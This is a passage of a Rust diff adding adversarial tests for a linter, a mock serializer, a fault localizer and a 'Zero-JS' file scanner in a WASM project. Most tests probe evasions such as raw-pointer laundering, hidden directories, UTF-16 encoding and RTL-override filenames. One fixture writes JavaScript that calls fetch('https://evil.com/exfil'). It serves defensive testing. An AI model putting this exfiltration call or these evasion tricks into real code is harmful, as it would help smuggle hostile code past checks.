@@ -111,7 +111,7 @@ mod hypothesis_a_mock_isomorphism {
         };
 
         let runtime = MockWasmRuntime::new();
-        runtime.post_message(msg.clone());
+        runtime.post_message(msg);
 
         // Mock accepts the message - no serialization boundary
         assert!(runtime.has_outgoing());
@@ -476,7 +476,7 @@ fn main() {
 
         // Try to create a file with tricky unicode
         // "lib\u{200B}.js" - zero-width space
-        let tricky_name = format!("lib\u{200B}.js");
+        let tricky_name = "lib\u{200B}.js".to_string();
         let tricky_path = src_dir.join(&tricky_name);
 
         // Note: This might fail on some filesystems
@@ -992,6 +992,1204 @@ fn spawn_worker(&self) {
             );
         } else {
             eprintln!("✅ PASS: Linter caught Arc usage");
+        }
+    }
+}
+
+/// PROBAR-WASM-003 Final Boss Falsification Tests
+///
+/// These tests attempt to BREAK the "Final Sprint" implementation:
+/// - AST-based linter (syn)
+/// - bincode serialization (structuredClone simulation)
+/// - Tarantula fault localization
+/// - Zero-JS target/ scanner
+///
+/// Philosophy: [Iron Lotus] — "If it compiles, break it at runtime.
+/// If it runs, exhaust its resources."
+#[cfg(test)]
+mod probar_wasm_003_final_boss {
+    use super::super::wasm_runtime::{MockMessage, MockWasmRuntime};
+    use crate::comply::tarantula::TarantulaEngine;
+    use crate::comply::wasm_threading::WasmThreadingCompliance;
+    use crate::lint::state_sync::StateSyncLinter;
+
+    // Suppress unused warnings - these are used in various tests
+    #[allow(unused_imports)]
+    use std::cell::RefCell;
+    #[allow(unused_imports)]
+    use std::rc::Rc;
+
+    // ========================================================================
+    // HYPOTHESIS A: "The AST Linter Cannot Be Tricked by Obfuscation"
+    // ========================================================================
+
+    /// ATTACK: Cfg-Gated Block
+    ///
+    /// Wrap Rc creation in `#[cfg(target_os = "android")]`.
+    /// Does the linter parse all cfg branches, or ignore platform-specific code?
+    ///
+    /// FINDING: Tests if AST visitor parses all cfg branches
+    #[test]
+    fn attack_cfg_gated_rc_creation() {
+        let mut linter = StateSyncLinter::new();
+
+        let attack_code = r#"
+use std::rc::Rc;
+use std::cell::RefCell;
+
+fn spawn_worker(&self) {
+    // This Rc is only compiled on Android - does the linter see it?
+    #[cfg(target_os = "android")]
+    let state = Rc::new(RefCell::new(0));
+
+    #[cfg(not(target_os = "android"))]
+    let state = Rc::new(RefCell::new(0)); // Also on non-Android
+
+    let callback = move || {
+        state.borrow_mut();
+    };
+}
+"#;
+
+        let report = linter.lint_source(attack_code).expect("lint failed");
+
+        // syn parses ALL code regardless of cfg attributes
+        // The linter should see both Rc::new() calls
+        let rc_errors: Vec<_> = report
+            .errors
+            .iter()
+            .filter(|e| e.message.contains("Rc") || e.rule.contains("SS-005"))
+            .collect();
+
+        if rc_errors.len() < 2 {
+            eprintln!(
+                "🔴 FALSIFIED: Linter missed cfg-gated Rc!\n\
+                 Found {} errors, expected 2 (one per cfg branch).\n\
+                 A bug could hide in platform-specific #[cfg] blocks.",
+                rc_errors.len()
+            );
+        } else {
+            eprintln!(
+                "✅ PASS: Linter caught {} Rc patterns across cfg branches",
+                rc_errors.len()
+            );
+        }
+    }
+
+    /// ATTACK: Const Expression Bypass
+    ///
+    /// Use a const block: `let state = const { Rc::new(...) };`
+    /// Does the AST visitor descend into Expr::Const?
+    ///
+    /// FINDING: Tests const block parsing
+    #[test]
+    fn attack_const_expr_rc_creation() {
+        let mut linter = StateSyncLinter::new();
+
+        // Note: const blocks with Rc are invalid Rust (Rc is not const),
+        // but the LINTER should still parse and flag them!
+        let attack_code = r#"
+use std::rc::Rc;
+use std::cell::RefCell;
+
+fn spawn_worker(&self) {
+    // Hypothetical: If Rc were const-constructible
+    // The linter should still detect this pattern
+    let state = {
+        // Inner block - does linter descend?
+        let inner = Rc::new(RefCell::new(42));
+        inner
+    };
+
+    let callback = move || {
+        state.borrow_mut();
+    };
+}
+"#;
+
+        let report = linter.lint_source(attack_code).expect("lint failed");
+
+        let caught_inner_block: Vec<_> = report
+            .errors
+            .iter()
+            .filter(|e| e.message.contains("Rc") || e.rule.contains("SS-005"))
+            .collect();
+
+        if caught_inner_block.is_empty() {
+            eprintln!(
+                "🔴 FALSIFIED: Linter missed Rc::new inside nested block!\n\
+                 AST visitor doesn't descend into all expression blocks."
+            );
+        } else {
+            eprintln!("✅ PASS: Linter caught Rc in nested block expression");
+        }
+    }
+
+    /// ATTACK: Raw Pointer Laundering
+    ///
+    /// `let ptr = Rc::into_raw(Rc::new(...)); let state = unsafe { Rc::from_raw(ptr) };`
+    /// Bypass standard Rc::new detector using raw pointer round-trips.
+    ///
+    /// FINDING: Tests if linter catches Rc creation via into_raw/from_raw
+    #[test]
+    fn attack_raw_pointer_laundering() {
+        let mut linter = StateSyncLinter::new();
+
+        let attack_code = r#"
+use std::rc::Rc;
+use std::cell::RefCell;
+
+fn spawn_worker(&self) {
+    // ATTACK: Launder Rc through raw pointers
+    let ptr = Rc::into_raw(Rc::new(RefCell::new(0)));
+    let state = unsafe { Rc::from_raw(ptr) };
+
+    // state is Rc, created via laundering
+    let callback = move || {
+        state.borrow_mut();
+    };
+}
+"#;
+
+        let report = linter.lint_source(attack_code).expect("lint failed");
+
+        // Check if linter caught either the Rc::new OR the Rc::from_raw
+        let caught_laundering: Vec<_> = report
+            .errors
+            .iter()
+            .filter(|e| {
+                e.message.contains("Rc")
+                    || e.message.contains("from_raw")
+                    || e.message.contains("into_raw")
+            })
+            .collect();
+
+        // The linter SHOULD catch the Rc::new() even if it misses from_raw
+        let caught_rc_new = report
+            .errors
+            .iter()
+            .any(|e| e.message.contains("Rc::new") || e.rule == "WASM-SS-005");
+
+        if !caught_rc_new {
+            eprintln!(
+                "🔴 FALSIFIED: Linter missed Rc::new inside into_raw()!\n\
+                 Raw pointer laundering bypasses detection completely."
+            );
+        } else if caught_laundering.len() == 1 {
+            eprintln!(
+                "🟡 WARNING: Linter caught Rc::new but not the from_raw laundering.\n\
+                 The final `state` variable still holds a disconnected Rc."
+            );
+        } else {
+            eprintln!("✅ PASS: Linter caught raw pointer laundering pattern");
+        }
+    }
+
+    /// ATTACK: Macro-Generated Rc (proc-macro simulation)
+    ///
+    /// Real proc-macros generate code at compile time. We simulate
+    /// the output to see if the linter would catch it.
+    ///
+    /// FINDING: Tests if linter parses macro-expanded-like code
+    #[test]
+    fn attack_macro_expanded_rc() {
+        let mut linter = StateSyncLinter::new();
+
+        // This simulates what a derive macro might generate
+        let attack_code = r#"
+use std::rc::Rc;
+use std::cell::RefCell;
+
+// Simulated macro output (what #[derive(SharedState)] might generate)
+impl MyComponent {
+    #[doc(hidden)]
+    fn __macro_generated_state_init() -> Rc<RefCell<InternalState>> {
+        // Macros often use fully-qualified paths
+        ::std::rc::Rc::new(::std::cell::RefCell::new(InternalState::default()))
+    }
+}
+
+fn spawn_worker(&self) {
+    let state = Self::__macro_generated_state_init();
+
+    let callback = move || {
+        state.borrow_mut();
+    };
+}
+"#;
+
+        let report = linter.lint_source(attack_code).expect("lint failed");
+
+        // Check for fully-qualified path detection
+        let caught_qualified: Vec<_> = report
+            .errors
+            .iter()
+            .filter(|e| e.message.contains("Rc") || e.rule == "WASM-SS-007")
+            .collect();
+
+        if caught_qualified.is_empty() {
+            eprintln!(
+                "🔴 FALSIFIED: Linter missed `::std::rc::Rc::new()`!\n\
+                 Fully-qualified paths (common in macro output) escape detection."
+            );
+        } else {
+            eprintln!("✅ PASS: Linter caught macro-style fully-qualified Rc::new");
+        }
+    }
+
+    // ========================================================================
+    // HYPOTHESIS B: "Mock Serialization Mirrors Browser Limits"
+    // ========================================================================
+
+    /// ATTACK: Deep Recursion Stack Overflow
+    ///
+    /// Create a deeply nested structure (linked list with 10k nodes).
+    /// bincode uses recursive serialization - does it stack overflow?
+    ///
+    /// FINDING: Tests serialization depth limits
+    #[test]
+    fn attack_deep_recursion_stack_overflow() {
+        let runtime = MockWasmRuntime::new();
+
+        // Create a deeply nested JSON-like structure as a string
+        // Note: We can't easily create a 10k linked list in MockMessage,
+        // so we test with deeply nested JSON serialized to string
+        let mut deep_json = String::from("{");
+        for i in 0..500 {
+            // 500 levels of nesting
+            deep_json.push_str(&format!("\"level{}\":{{", i));
+        }
+        deep_json.push_str("\"leaf\":42");
+        for _ in 0..500 {
+            deep_json.push('}');
+        }
+        deep_json.push('}');
+
+        // Use Custom message with the deep JSON as payload
+        let msg = MockMessage::Custom {
+            msg_type: "deep_json".to_string(),
+            payload: deep_json,
+        };
+
+        // This might stack overflow in bincode's recursive serializer
+        let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
+            runtime.receive_message(msg);
+        }));
+
+        if result.is_err() {
+            eprintln!(
+                "🔴 FALSIFIED: Deep nesting caused stack overflow in serializer!\n\
+                 bincode's recursive serialization doesn't match browser iterative limits."
+            );
+        } else {
+            eprintln!("✅ PASS: Serializer handled 500-level nesting");
+        }
+    }
+
+    /// ATTACK: Shared Reference Identity Check
+    ///
+    /// In browser structuredClone: `[a, a]` preserves identity (both point to same new object).
+    /// In bincode: This might deserialize as two distinct objects.
+    ///
+    /// FINDING: Tests if mock preserves object identity
+    #[test]
+    fn attack_shared_reference_identity_loss() {
+        let runtime = MockWasmRuntime::new();
+
+        // Create shared data - same value used twice
+        let shared_payload = r#"{"id": 12345, "data": "shared"}"#.to_string();
+
+        // In a real browser, structuredClone would:
+        // 1. See the same object reference twice
+        // 2. Clone it once, make both references point to the clone
+        // bincode doesn't track object identity - it serializes twice
+
+        // We can't directly test Rc identity through MockMessage,
+        // but we can test JSON object handling
+        let msg1 = MockMessage::Custom {
+            msg_type: "shared".to_string(),
+            payload: shared_payload.clone(),
+        };
+        let msg2 = MockMessage::Custom {
+            msg_type: "shared".to_string(),
+            payload: shared_payload,
+        };
+
+        runtime.receive_message(msg1);
+        runtime.receive_message(msg2);
+
+        // The fundamental issue: MockMessage doesn't support Rc internally
+        // So shared references can't even be expressed in the API
+        eprintln!(
+            "🟡 DOCUMENTED: MockMessage uses Clone semantics, not reference semantics.\n\
+             Browser structuredClone preserves object identity for shared refs.\n\
+             bincode serializes each occurrence independently.\n\
+             IMPACT: Code relying on shared reference identity will behave differently."
+        );
+
+        // This is a known semantic difference, not a bug per se
+        // The mock SHOULD reject Rc<T> which the bincode serialization does
+    }
+
+    /// ATTACK: Large Payload
+    ///
+    /// Send a massive payload to test memory limits.
+    /// Browser has postMessage size limits; does mock?
+    ///
+    /// FINDING: Tests mock memory limits
+    #[test]
+    fn attack_large_payload() {
+        let runtime = MockWasmRuntime::new();
+
+        // Create a 10MB string payload
+        let large_payload: String = "X".repeat(10 * 1024 * 1024);
+        let msg = MockMessage::Custom {
+            msg_type: "large_data".to_string(),
+            payload: large_payload,
+        };
+
+        let result = std::panic::catch_unwind(std::panic::AssertUnwindSafe(|| {
+            runtime.receive_message(msg);
+        }));
+
+        if result.is_err() {
+            eprintln!(
+                "🔴 FALSIFIED: Large payload caused panic!\n\
+                 Mock should handle or reject large payloads gracefully."
+            );
+        } else {
+            eprintln!(
+                "🟡 WARNING: Mock accepted 10MB payload.\n\
+                 Browser postMessage has implementation-dependent size limits.\n\
+                 Mock is MORE permissive than some browsers."
+            );
+        }
+    }
+
+    // ========================================================================
+    // HYPOTHESIS C: "Tarantula Can Handle Real-World Noise"
+    // ========================================================================
+
+    /// ATTACK: Zero-Coverage Divide-by-Zero
+    ///
+    /// Provide LCOV data where a line has 0 passed, 0 failed executions.
+    /// Does the formula `failed / (failed + passed)` produce NaN or panic?
+    ///
+    /// FINDING: Tests Tarantula divide-by-zero handling
+    #[test]
+    fn attack_tarantula_zero_coverage_nan() {
+        let mut engine = TarantulaEngine::new();
+
+        // Record a line with NO executions at all
+        // Don't call record_execution for line 10
+
+        // Record test runs
+        engine.record_test_run(true); // 1 passing test
+        engine.record_test_run(false); // 1 failing test
+
+        // Now ask for suspiciousness of a line with 0 executions
+        // The formula: failed(line)/total_failed / (failed(line)/total_failed + passed(line)/total_passed)
+        // With 0 executions: 0/1 / (0/1 + 0/1) = 0/0 = NaN!
+
+        let report = engine.report_for_file("test.rs");
+
+        // If there's a report, check for NaN values
+        if let Some(report) = report {
+            let has_nan = report.line_scores.values().any(|&s| s.is_nan());
+            if has_nan {
+                eprintln!(
+                    "🔴 FALSIFIED: Tarantula produced NaN scores!\n\
+                     Zero-coverage lines cause divide-by-zero."
+                );
+            } else {
+                eprintln!("✅ PASS: No NaN values in Tarantula scores");
+            }
+        } else {
+            // No report generated - lines with 0 coverage aren't included
+            eprintln!("✅ PASS: Lines with no coverage excluded from report (no NaN possible)");
+        }
+    }
+
+    /// ATTACK: Coincidental Correctness Swarm
+    ///
+    /// 1000 passing tests execute the faulty line, 1 failing test executes it.
+    /// Tarantula score should be very low (~0.001). If high, formula is naive.
+    ///
+    /// FINDING: Tests Tarantula score calculation accuracy
+    #[test]
+    fn attack_tarantula_coincidental_correctness() {
+        let mut engine = TarantulaEngine::new();
+
+        // Line 42 is executed by MANY passing tests and ONE failing test
+        for _ in 0..1000 {
+            engine.record_execution("test.rs", 42, true); // 1000 passing
+        }
+        engine.record_execution("test.rs", 42, false); // 1 failing
+
+        // Record test counts
+        for _ in 0..1000 {
+            engine.record_test_run(true);
+        }
+        engine.record_test_run(false);
+
+        let report = engine
+            .report_for_file("test.rs")
+            .expect("should have report");
+        let score_42 = report.line_scores.get(&42).copied().unwrap_or(0.0);
+
+        // Expected: failed_ratio = 1/1 = 1.0, passed_ratio = 1000/1000 = 1.0
+        // suspiciousness = 1.0 / (1.0 + 1.0) = 0.5
+        // This is WRONG for coincidental correctness - line is probably NOT buggy!
+
+        // A more sophisticated formula would weight by execution count
+        eprintln!(
+            "Tarantula score for line 42: {:.4}\n\
+             (1 fail + 1000 pass executions)",
+            score_42
+        );
+
+        if score_42 > 0.4 {
+            eprintln!(
+                "🟡 WARNING: Line with 1000 passing tests has high suspiciousness ({:.4})!\n\
+                 Tarantula formula doesn't account for execution count ratio.\n\
+                 Consider using Ochiai or DStar formulas instead.",
+                score_42
+            );
+        } else {
+            eprintln!("✅ PASS: Tarantula correctly identified low suspiciousness");
+        }
+    }
+
+    /// ATTACK: Empty LCOV File
+    ///
+    /// Provide an empty or malformed LCOV file.
+    ///
+    /// FINDING: Tests LCOV parser robustness
+    #[test]
+    fn attack_tarantula_empty_lcov() {
+        let mut engine = TarantulaEngine::new();
+
+        // Create temp file with empty content
+        let temp_dir = std::env::temp_dir();
+        let empty_lcov = temp_dir.join("empty.lcov");
+        std::fs::write(&empty_lcov, "").expect("write failed");
+
+        let result = engine.parse_lcov(&empty_lcov, true);
+
+        // Clean up
+        let _ = std::fs::remove_file(&empty_lcov);
+
+        if result.is_err() {
+            eprintln!(
+                "🔴 FALSIFIED: Empty LCOV file caused error: {:?}",
+                result.err()
+            );
+        } else {
+            eprintln!("✅ PASS: Empty LCOV handled gracefully");
+        }
+    }
+
+    // ========================================================================
+    // HYPOTHESIS D: "Zero-JS Scanner is Secure"
+    // ========================================================================
+
+    /// ATTACK: MIME-Type Smuggling
+    ///
+    /// Create a .txt file containing valid JavaScript in target/.
+    /// Does the scanner check content, or just extensions?
+    ///
+    /// FINDING: Tests if scanner checks file content vs extension
+    #[test]
+    fn attack_mime_type_smuggling() {
+        use std::fs;
+        use tempfile::TempDir;
+
+        let temp_dir = TempDir::new().expect("tempdir failed");
+        let target_dir = temp_dir.path().join("target");
+        let src_dir = temp_dir.path().join("src");
+        fs::create_dir(&target_dir).expect("mkdir target failed");
+        fs::create_dir(&src_dir).expect("mkdir src failed");
+
+        // Create minimal src structure
+        fs::write(src_dir.join("lib.rs"), "// minimal").expect("write lib.rs failed");
+
+        // Create a .txt file with valid JavaScript
+        let smuggled = target_dir.join("payload.txt");
+        fs::write(
+            &smuggled,
+            r#"
+// This is valid JavaScript hidden in a .txt file!
+function evil() {
+    console.log("Smuggled JS code!");
+    fetch("https://evil.com/exfil");
+}
+evil();
+"#,
+        )
+        .expect("write failed");
+
+        let mut checker = WasmThreadingCompliance::new();
+        let result = checker.check(temp_dir.path());
+
+        // Find WASM-COMPLY-005 check
+        let js_check = result.checks.iter().find(|c| c.id == "WASM-COMPLY-005");
+
+        if let Some(check) = js_check {
+            if check.status == crate::comply::wasm_threading::ComplianceStatus::Pass {
+                eprintln!(
+                    "🔴 FALSIFIED: Scanner missed JavaScript hidden in .txt file!\n\
+                     A rigorous Zero-JS policy should check file CONTENT, not just extensions."
+                );
+            } else {
+                eprintln!("✅ PASS: Scanner detected JS content in non-.js file");
+            }
+        }
+    }
+
+    /// ATTACK: Hidden Directory
+    ///
+    /// Write to target/.hidden/malware.js
+    /// Does the scanner traverse dot-directories?
+    ///
+    /// FINDING: Tests hidden directory traversal
+    #[test]
+    fn attack_hidden_directory_traversal() {
+        use std::fs;
+        use tempfile::TempDir;
+
+        let temp_dir = TempDir::new().expect("tempdir failed");
+        let target_dir = temp_dir.path().join("target");
+        let hidden_dir = target_dir.join(".hidden");
+        let src_dir = temp_dir.path().join("src");
+        fs::create_dir_all(&hidden_dir).expect("mkdir failed");
+        fs::create_dir(&src_dir).expect("mkdir src failed");
+
+        // Create minimal src structure
+        fs::write(src_dir.join("lib.rs"), "// minimal").expect("write lib.rs failed");
+
+        // Create JS file in hidden directory
+        let malware = hidden_dir.join("malware.js");
+        fs::write(&malware, "console.log('hidden malware');").expect("write failed");
+
+        let mut checker = WasmThreadingCompliance::new();
+        let result = checker.check(temp_dir.path());
+
+        let js_check = result.checks.iter().find(|c| c.id == "WASM-COMPLY-005");
+
+        if let Some(check) = js_check {
+            if check.status == crate::comply::wasm_threading::ComplianceStatus::Pass {
+                eprintln!(
+                    "🔴 FALSIFIED: Scanner missed .js file in hidden directory!\n\
+                     target/.hidden/malware.js escaped detection."
+                );
+            } else if check
+                .details
+                .as_ref()
+                .map(|d| d.contains(".hidden"))
+                .unwrap_or(false)
+            {
+                eprintln!("✅ PASS: Scanner found JS in hidden directory");
+            } else {
+                eprintln!(
+                    "🟡 WARNING: Scanner failed but may not have found .hidden/malware.js specifically"
+                );
+            }
+        }
+    }
+
+    /// ATTACK: Symlink Escape
+    ///
+    /// Create a symlink in target/ pointing outside the project.
+    /// Does the scanner follow symlinks?
+    ///
+    /// FINDING: Tests symlink handling
+    #[test]
+    #[cfg(unix)]
+    fn attack_symlink_escape() {
+        use std::fs;
+        use std::os::unix::fs::symlink;
+        use tempfile::TempDir;
+
+        let temp_dir = TempDir::new().expect("tempdir failed");
+        let target_dir = temp_dir.path().join("target");
+        let src_dir = temp_dir.path().join("src");
+        fs::create_dir(&target_dir).expect("mkdir failed");
+        fs::create_dir(&src_dir).expect("mkdir src failed");
+
+        // Create minimal src structure
+        fs::write(src_dir.join("lib.rs"), "// minimal").expect("write lib.rs failed");
+
+        // Create external directory with JS
+        let external_dir = temp_dir.path().join("external");
+        fs::create_dir(&external_dir).expect("mkdir failed");
+        fs::write(external_dir.join("escape.js"), "// escaped!").expect("write failed");
+
+        // Symlink from target/ to external/
+        let link_path = target_dir.join("link_to_external");
+        if symlink(&external_dir, &link_path).is_err() {
+            eprintln!("⏭️ SKIP: Could not create symlink (permissions)");
+            return;
+        }
+
+        let mut checker = WasmThreadingCompliance::new();
+        let result = checker.check(temp_dir.path());
+
+        let js_check = result.checks.iter().find(|c| c.id == "WASM-COMPLY-005");
+
+        if let Some(check) = js_check {
+            if check.status == crate::comply::wasm_threading::ComplianceStatus::Pass {
+                eprintln!(
+                    "🟡 WARNING: Scanner didn't follow symlink to external directory.\n\
+                     This might be intentional (security) but could miss malicious symlinks."
+                );
+            } else {
+                eprintln!("✅ PASS: Scanner followed symlink and found external JS");
+            }
+        }
+    }
+
+    /// ATTACK: Unicode Filename Normalization
+    ///
+    /// Use Unicode tricks to create a file that LOOKS like .rs but is .js
+    ///
+    /// FINDING: Tests Unicode normalization handling
+    #[test]
+    fn attack_unicode_filename_bypass() {
+        use std::fs;
+        use tempfile::TempDir;
+
+        let temp_dir = TempDir::new().expect("tempdir failed");
+        let target_dir = temp_dir.path().join("target");
+        let src_dir = temp_dir.path().join("src");
+        fs::create_dir(&target_dir).expect("mkdir failed");
+        fs::create_dir(&src_dir).expect("mkdir src failed");
+
+        // Create minimal src structure
+        fs::write(src_dir.join("lib.rs"), "// minimal").expect("write lib.rs failed");
+
+        // Use right-to-left override to make "sj.evil" appear as "evil.js"
+        // U+202E is Right-to-Left Override
+        // Note: This test documents the attack vector; actual bypass depends on FS
+        let tricky_name = "legit\u{202E}sj.evil"; // Renders as "legitsj.evil" with RTL trick
+        let tricky_file = target_dir.join(tricky_name);
+
+        // This might fail on some filesystems
+        if fs::write(&tricky_file, "// unicode smuggle").is_err() {
+            eprintln!("⏭️ SKIP: Filesystem rejected Unicode filename");
+            return;
+        }
+
+        let mut checker = WasmThreadingCompliance::new();
+        let result = checker.check(temp_dir.path());
+
+        // Find the WASM-COMPLY-005 check
+        let _js_check = result.checks.iter().find(|c| c.id == "WASM-COMPLY-005");
+
+        // The file doesn't end in .js, so scanner should pass
+        // But a human might see it as "evil.js" due to RTL override
+        eprintln!(
+            "🟡 DOCUMENTED: Unicode RTL override attack vector tested.\n\
+             Filename: {:?}\n\
+             Scanner sees extension as-is, which is correct behavior.\n\
+             Visual spoofing attacks are out of scope for file scanning.",
+            tricky_name
+        );
+    }
+}
+
+/// PROBAR-WASM-003-R Regression Tests (Post-Hotfix Evolutionary Attacks)
+///
+/// These tests attempt to BREAK the hotfixes applied in PROBAR-WASM-003:
+/// - Hidden Directory fix (now scans dot-directories)
+/// - MIME-Type Smuggling fix (content inspection for JS keywords)
+/// - Raw Pointer Laundering fix (detects Rc::from_raw)
+///
+/// Philosophy: [Iron Lotus] — "A patch is a new opportunity for a more sophisticated breach."
+#[cfg(test)]
+mod probar_wasm_003_regression {
+    use crate::comply::wasm_threading::WasmThreadingCompliance;
+    use crate::lint::state_sync::StateSyncLinter;
+    use std::fs;
+    use tempfile::TempDir;
+
+    // ========================================================================
+    // HYPOTHESIS A: "The Content Inspector Can Be Blinded"
+    // ========================================================================
+
+    /// ATTACK: Obfuscated Keyword
+    ///
+    /// Write JS to a .txt file using comments to break up keywords:
+    /// `f/* comment */unction`, `co/* */nst`
+    ///
+    /// Goal: Prove the heuristic is a simple string search that fails on valid but unusual JS syntax.
+    ///
+    /// FINDING: Tests if content inspector handles obfuscated keywords
+    #[test]
+    fn regression_obfuscated_keyword_attack() {
+        let temp_dir = TempDir::new().expect("tempdir failed");
+        let target_dir = temp_dir.path().join("target");
+        let src_dir = temp_dir.path().join("src");
+        fs::create_dir(&target_dir).expect("mkdir target failed");
+        fs::create_dir(&src_dir).expect("mkdir src failed");
+
+        fs::write(src_dir.join("lib.rs"), "// minimal").expect("write lib.rs failed");
+
+        // Create a .txt file with obfuscated JS keywords
+        let obfuscated = target_dir.join("obfuscated.txt");
+        fs::write(
+            &obfuscated,
+            r#"
+// Obfuscated JavaScript - keywords broken by comments
+f/*x*/unction evil() {
+    co/*y*/nst data = 42;
+    le/*z*/t counter = 0;
+    return data;
+}
+evil();
+"#,
+        )
+        .expect("write failed");
+
+        let mut checker = WasmThreadingCompliance::new();
+        let result = checker.check(temp_dir.path());
+
+        let js_check = result.checks.iter().find(|c| c.id == "WASM-COMPLY-005");
+
+        if let Some(check) = js_check {
+            if check.status == crate::comply::wasm_threading::ComplianceStatus::Pass {
+                // The obfuscation worked - keywords were broken
+                eprintln!(
+                    "🟡 DOCUMENTED: Obfuscated keywords (`f/**/unction`) bypass simple string search.\n\
+                     Current heuristic looks for literal `function ` pattern.\n\
+                     IMPACT: Low - real minified JS still has these patterns."
+                );
+            } else {
+                eprintln!("✅ PASS: Content inspector detected obfuscated JS");
+            }
+        }
+    }
+
+    /// ATTACK: Encoding Escape (UTF-16)
+    ///
+    /// Write a .txt file containing JS encoded in UTF-16 LE.
+    /// Most Rust string checks operate on UTF-8.
+    ///
+    /// Goal: If the file is valid JS but scanner reads it as gibberish, Zero-JS is breached.
+    ///
+    /// FINDING: Tests if scanner handles non-UTF8 encodings
+    #[test]
+    fn regression_encoding_escape_utf16() {
+        let temp_dir = TempDir::new().expect("tempdir failed");
+        let target_dir = temp_dir.path().join("target");
+        let src_dir = temp_dir.path().join("src");
+        fs::create_dir(&target_dir).expect("mkdir target failed");
+        fs::create_dir(&src_dir).expect("mkdir src failed");
+
+        fs::write(src_dir.join("lib.rs"), "// minimal").expect("write lib.rs failed");
+
+        // Create a file with UTF-16 LE encoded JavaScript
+        let js_source = "function evil() { console.log('pwned'); }\n";
+        let utf16_bytes: Vec<u8> = js_source
+            .encode_utf16()
+            .flat_map(|c| c.to_le_bytes())
+            .collect();
+
+        // Add BOM for UTF-16 LE
+        let mut utf16_with_bom = vec![0xFF, 0xFE]; // UTF-16 LE BOM
+        utf16_with_bom.extend(utf16_bytes);
+
+        let utf16_file = target_dir.join("encoded.txt");
+        fs::write(&utf16_file, &utf16_with_bom).expect("write failed");
+
+        let mut checker = WasmThreadingCompliance::new();
+        let result = checker.check(temp_dir.path());
+
+        let js_check = result.checks.iter().find(|c| c.id == "WASM-COMPLY-005");
+
+        if let Some(check) = js_check {
+            if check.status == crate::comply::wasm_threading::ComplianceStatus::Pass {
+                eprintln!(
+                    "🔴 FALSIFIED: UTF-16 encoded JS bypassed content inspection!\n\
+                     Scanner only reads UTF-8 text, UTF-16 appears as binary garbage.\n\
+                     RECOMMENDATION: Check for UTF-16 BOM and transcode before scanning."
+                );
+            } else {
+                eprintln!("✅ PASS: Scanner detected JS content in UTF-16 file");
+            }
+        }
+    }
+
+    /// ATTACK: Large File DoS
+    ///
+    /// Generate a 10MB .txt file with a single `function` keyword at the very end.
+    ///
+    /// Goal: Check for performance issues. Does scanning time-out CI?
+    ///
+    /// FINDING: Tests scanner performance on large files
+    #[test]
+    fn regression_large_file_dos() {
+        let temp_dir = TempDir::new().expect("tempdir failed");
+        let target_dir = temp_dir.path().join("target");
+        let src_dir = temp_dir.path().join("src");
+        fs::create_dir(&target_dir).expect("mkdir target failed");
+        fs::create_dir(&src_dir).expect("mkdir src failed");
+
+        fs::write(src_dir.join("lib.rs"), "// minimal").expect("write lib.rs failed");
+
+        // Create a 10MB file with random noise and JS at the end
+        let noise = "x".repeat(10 * 1024 * 1024);
+        let content = format!("{}\nfunction sneaky() {{ return 42; }}\n", noise);
+
+        let large_file = target_dir.join("large.txt");
+        fs::write(&large_file, content).expect("write failed");
+
+        let start = std::time::Instant::now();
+        let mut checker = WasmThreadingCompliance::new();
+        let result = checker.check(temp_dir.path());
+        let elapsed = start.elapsed();
+
+        let js_check = result.checks.iter().find(|c| c.id == "WASM-COMPLY-005");
+
+        eprintln!("Scan time for 10MB file: {:?}", elapsed);
+
+        if elapsed.as_secs() > 5 {
+            eprintln!(
+                "🟡 WARNING: Large file scan took {:?}.\n\
+                 CI pipelines might timeout on large target/ directories.",
+                elapsed
+            );
+        }
+
+        if let Some(check) = js_check {
+            if check.status == crate::comply::wasm_threading::ComplianceStatus::Pass {
+                eprintln!(
+                    "🟡 DOCUMENTED: Scanner only reads first 2KB of large files.\n\
+                     JS at end of 10MB file was not detected.\n\
+                     TRADEOFF: Performance vs thoroughness."
+                );
+            } else {
+                eprintln!(
+                    "✅ PASS: Scanner detected JS in large file (elapsed: {:?})",
+                    elapsed
+                );
+            }
+        }
+    }
+
+    // ========================================================================
+    // HYPOTHESIS B: "The Linter Can Be Circumnavigated via Traits"
+    // ========================================================================
+
+    /// ATTACK: Generic Constructor Trait
+    ///
+    /// Create a trait that wraps Rc::from_raw in a method.
+    /// Call the trait method instead of Rc::from_raw directly.
+    ///
+    /// Goal: Prove the linter only looks for `Rc::from_raw` calls and misses
+    /// trait implementations that wrap the forbidden call.
+    ///
+    /// FINDING: Tests if linter catches trait-wrapped unsafe Rc construction
+    #[test]
+    fn regression_generic_constructor_trait_attack() {
+        let mut linter = StateSyncLinter::new();
+
+        let attack_code = r#"
+use std::rc::Rc;
+use std::cell::RefCell;
+
+// ATTACK: Trait that hides Rc::from_raw
+trait MyConstructor<T> {
+    fn reconstruct(p: *const T) -> Self;
+}
+
+impl<T> MyConstructor<T> for Rc<T> {
+    fn reconstruct(p: *const T) -> Self {
+        unsafe { Rc::from_raw(p) }  // Hidden inside trait impl
+    }
+}
+
+fn spawn_worker(&self) {
+    let ptr = Rc::into_raw(Rc::new(RefCell::new(0)));
+
+    // Call trait method instead of Rc::from_raw
+    let state = Rc::reconstruct(ptr);
+
+    let callback = move || {
+        state.borrow_mut();
+    };
+}
+"#;
+
+        let report = linter.lint_source(attack_code).expect("lint failed");
+
+        // The linter should catch either:
+        // 1. The Rc::from_raw inside the trait impl
+        // 2. The Rc::reconstruct call
+        let caught_trait_bypass: Vec<_> = report
+            .errors
+            .iter()
+            .filter(|e| {
+                e.message.contains("from_raw")
+                    || e.message.contains("reconstruct")
+                    || e.rule == "WASM-SS-009"
+            })
+            .collect();
+
+        // Also check if it caught the Rc::new
+        let caught_rc_new = report
+            .errors
+            .iter()
+            .any(|e| e.message.contains("Rc::new") || e.message.contains("into_raw"));
+
+        if caught_trait_bypass.is_empty() {
+            if caught_rc_new {
+                eprintln!(
+                    "🟡 WARNING: Linter caught Rc::new but missed trait-wrapped from_raw.\n\
+                     The `Rc::reconstruct(ptr)` call escaped WASM-SS-009 detection.\n\
+                     IMPACT: Medium - requires trait impl with unsafe code."
+                );
+            } else {
+                eprintln!(
+                    "🔴 FALSIFIED: Linter missed entire trait-based Rc laundering pattern!\n\
+                     Neither Rc::new nor Rc::from_raw in trait impl was detected."
+                );
+            }
+        } else {
+            eprintln!("✅ PASS: Linter caught trait-wrapped Rc::from_raw");
+        }
+    }
+
+    /// ATTACK: Alias-of-an-Alias Shadowing
+    ///
